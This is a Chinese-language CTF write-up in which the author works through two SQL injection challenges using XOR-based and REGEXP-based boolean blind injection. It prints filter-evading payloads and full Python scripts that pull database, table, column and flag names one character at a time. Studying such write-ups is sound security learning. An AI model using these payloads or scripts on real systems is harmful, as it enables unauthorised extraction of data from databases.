## 说在前面
最近在尝试总结一些SQL注入相关的知识，看了很多师傅们整理的文章，受益匪浅。决定根据他们的思路去尝试复现一些CTF题来学习，自己也尝试出了一个SQL注入题来加深印象。总的来说还是学到很多东西的。
第一次投稿文章，里面的内容有些乱。有问题还希望师傅们提出来，谢谢。
## 1.异或注入
题目地址：
在一个师傅的博客中看到这题的Writeup，尝试按照他的payload进行复现，怎么都复现不出来。后来在安全客上看到另一篇异或注入的文章，才把这个题解决了。
初步测试之后会发现，题目过滤了`空格，+，*，or，substr`...等一些字符。而且#号注释也不起作用。
于是尝试异或注入。
    http://119.23.73.3:5004/?id=1'^'1   返回错误
    http://119.23.73.3:5004/?id=1'^'0   返回正常
在MYSQL中：
可见，当/?id=1'^'1时，传递到数据库当中，是id=0，由于为0的id不存在，所以这里返回错误。第二个同理。
这里属于布尔盲注，于是构造payload，用脚本跑：
检索数据库：
    id=2'^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))=104))^'1'='1
    检索出来的库为：information_schema,moctf,mysql,performance_schema
检索表：
    id=2'^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema='moctf')),1,1))=104))^'1'='1
    检索出来的表：do_y0u_l1ke_long_t4ble_name,news
检索字段：
    id=2'^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name='do_y0u_l1ke_long_t4ble_name')),1,1))=104))^'1'='1
    检索出来的字段：d0_you_als0_l1ke_very_long_column_name
读Flag：
    id=2'^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))=104))^'1'='1
    moctfb1ind_SQL_1njecti0n_g0od
脚本：
    import requests
    #文字转ascii ord()
    #ascii转文字 ascii()
    dic = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,"
    url = "http://119.23.73.3:5004/?id=2'^"
    keyword = "Tip"
    string = ""
    for i in range(1, 300):
        for j in dic:
            payload = "!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),{0},1))={1}))^'1'='1".format(str(i),ord(j))
            url_get = url + payload
            print(url_get)
            content = requests.get(url_get)
            if keyword in content.text:
                string += j
                print(string)
                break
    print("result = " + string)
跑出来的Flag：
## 2.REGEXP盲注
题目链接：
Writeup(要登录)：
这道题我本来是信心满满的，然后越做越不对劲。做这道题的时候并没有fuzz的字段还没有逗号，莫名就会被拦截，搞得一头雾水。最后还是跑去看Writeup了。
先fuzz单字符来看看waf。还是拦截了很多的，而且逗号和空格也被过滤了。
除此之外，被过滤的还有：is not, union, sleep, substr, benchmark, substring, and。
并且根据大佬的思路，这里的`or，+，*`也都会被替换为空
看来时间盲注是没戏了。并且过滤了逗号。
我们知道，regexp盲注的原理是用正则表达式匹配。
例子：
    正常的语句为：select username from users where id = 1
    正常返回：admin
    构造语句：
    select (select username from users where id = 1) regexp '^a' 返回真(1)
    select (select username from users where id = 1) regexp '^b' 返回假(0)
    因为这里'^a'是匹配以a开头的字符串，原来正常返回的就是admin，所以会返回真。
    继续就可以使用 regexp '^ad'...读出想要的数据
那么这里该怎么构造呢？
  * 获取version
先用length来判断verison的长度：
    id=11'Or(LENGTH(version())=6)Or'1'='
由于^被过滤了，所以用$来从尾部开始读。
脚本：
    import requests
    key = "You are in"
    words = ""
    data = {"id": ""}
    word = '0123456789.'
    for i in range(10):
        for j in word:
            data['id'] = "11'Or(SELECT(version()regexp'{}$'))Or'1'='".format(j+words)
            print(data)
            content = requests.post("http://ctf5.shiyanbar.com/web/earnest/index.php", data = data)
            if key in content.text:
                words = str(j) + words
                print(words)
最后跑出来为：“5.6..4”
  * 获取数据库名
将上面的word替换为："0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,",
version()替换为database()即可。
跑出来为：Ctf_sql_bOol_bLInd
  * 获取表
注意这里的seperator里面的or要双写。
    import requests
    key = "You are in"
    words = ""
    data = {"id": ""}
    word = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~."
    for i in range(30):
        for j in word:
            data['id'] = "11'Or(SELECT((SELECT(group_concat(table_name\nseparatoorr\n'@'))FROM(INFORMATION_SCHEMA.tables)WHERE(TABLE_SCHEMA=database()))regexp'{}$'))Or'1'='".format(j+words)
            print(data)
            content = requests.post("http://ctf5.shiyanbar.com/web/earnest/index.php", data = data)
            #print(content.text)
            if key in content.text:
                words = str(j) + words
                print(words)
跑出来的表：fIAg@useRs
可能是脚本的原因，我跑出来的表是有大写有小写。
并且这里有个坑就是逗号被过滤了，导致group_concat必须使用separator指定字符来分割。
  * 获取字段
    import requests
    key = "You are in"
    words = ""
    data = {"id": ""}
    word = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~."
    for i in range(30):
        for j in word:
            data['id'] = "11'Or(SELECT((SELECT(group_concat(column_name\nseparatoorr\n'@'))FROM(INFORMATION_SCHEMA.columns)WHERE(table_name='fiag'))regexp'{}$'))Or'1'='".format(j+words)
            print(data)
            content = requests.post("http://ctf5.shiyanbar.com/web/earnest/index.php", data = data)
            #print(content.text)
            if key in content.text:
                if j == "$":
                    words = j+ words
                else:
                    words = j+ words
                print(words)
这里的坑实在是太奇怪了，当word里面不加点号时，跑出来只有：4g，原因是字段的名字为fl$4g，里面包含一个$导致正则匹配错误。
Writeup原作者，将点号加到了word里。跑出来就为：fl..g，可以猜测到字段名为：fl$4g (真的是猜测)
在正则当中，点号是用来匹配任意字符的，这里的$就会被.替代。这里我真的被卡了好久。
  * 获取flag
    import requests
    key = "You are in"
    words = ""
    data = {"id": ""}
    word = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_{}@~."
    for i in range(30):
        for j in word:
            data['id'] = "11'Or(SELECT(SELECT(fl$4g)FROM(fiag))regexp'{}$')Or'1'='".format(str(j)+words)
            print(data)
            content = requests.post("http://ctf5.shiyanbar.com/web/earnest/index.php", data = data)
            #print(content.text)
            if key in content.text:
                words = str(j) + words
                print(words)
最后跑出来的结果为：
    Fla.{HAh.~YOu.WIn.}
像跑字段一样尝试之后可以猜测到：
最后的flag为：